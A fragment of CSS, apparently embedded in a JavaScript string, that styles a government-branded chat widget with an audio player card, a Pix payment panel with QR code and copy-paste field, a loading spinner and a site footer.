.chat-root .gov-audio-card { background: #fff; border: 1px solid #cbd5e1; border-left: 4px solid #1351B4; border-radius: 12px; padding: 12px 14px; width: 100%; max-width: 320px; display: flex; align-items: center; gap: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
.chat-root .audio-play-btn { width: 48px; height: 48px; border-radius: 50%; background: #1351B4; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #fff; box-shadow: 0 3px 10px rgba(19,81,180,0.3); transition: transform 0.15s; }
.chat-root .audio-play-btn:hover { transform: scale(1.05); }
.chat-root .audio-track-info { flex: 1; display: flex; flex-direction: column; gap: 6px; }
.chat-root .audio-track-bar { height: 6px; background: #e2e8f0; border-radius: 999px; cursor: pointer; width: 100%; position: relative; overflow: hidden; }
.chat-root .audio-track-fill { height: 100%; background: #1351B4; border-radius: 999px; width: 0%; transition: width 0.1s linear; }
.chat-root .audio-track-time { font-size: 11.5px; color: #64748b; font-weight: 600; display: flex; justify-content: space-between; }
.chat-root .pix-container { background: #fff; border: 2px solid #1351B4; border-radius: 16px; padding: 22px 18px; margin: 14px 0; text-align: center; box-shadow: 0 6px 20px rgba(19,81,180,0.08); animation: fadeUp .35s ease both; }
.chat-root .pix-header-badge { display: inline-flex; align-items: center; gap: 6px; background: #ECFDF5; color: #168821; border: 1px solid #A7F3D0; border-radius: 50px; padding: 5px 14px; font-size: 12px; font-weight: 800; margin-bottom: 12px; }
.chat-root .pix-title { font-size: 16px; font-weight: 800; color: #0f172a; margin-bottom: 4px; }
.chat-root .pix-sub { font-size: 12.5px; color: #64748b; margin-bottom: 16px; }
.chat-root .qrcode-wrapper { justify-content: center; margin-bottom: 16px; padding: 10px; background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; display: inline-block; }
.chat-root .qrcode-img { width: 190px; height: 190px; display: block; }
.chat-root .pix-copy-paste { background: #f8fafc; border: 1px dashed #94a3b8; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 11.5px; word-break: break-all; margin-bottom: 12px; cursor: pointer; color: #334155; text-align: left; }
.chat-root .pix-status { font-size: 13px; color: #475569; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 600; }
.chat-root .pix-status .spinner { width: 16px; height: 16px; border: 2.5px solid #168821; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.chat-root .site-footer { background: #071D41; padding: 12px 18px; display: flex; flex-direction: column; justify-content: center; flex-shrink: 0; }
.chat-root .site-footer .gv { color: #fff; font-size: 16px; font-weight: 900; letter-spacing: -.5px; margin-bottom: 2px; }
.chat-root .site-footer .gv span { color: #FDB913; }
.chat-root .site-footer .gv-sub { color: #cbd5e1; font-size: 10.5px; line-height: 1.4; }
.chat-root .site-footer .gv-copy { color: #fff; font-size: 10.5px; font-weight: 700; margin-top: 2px; }
`
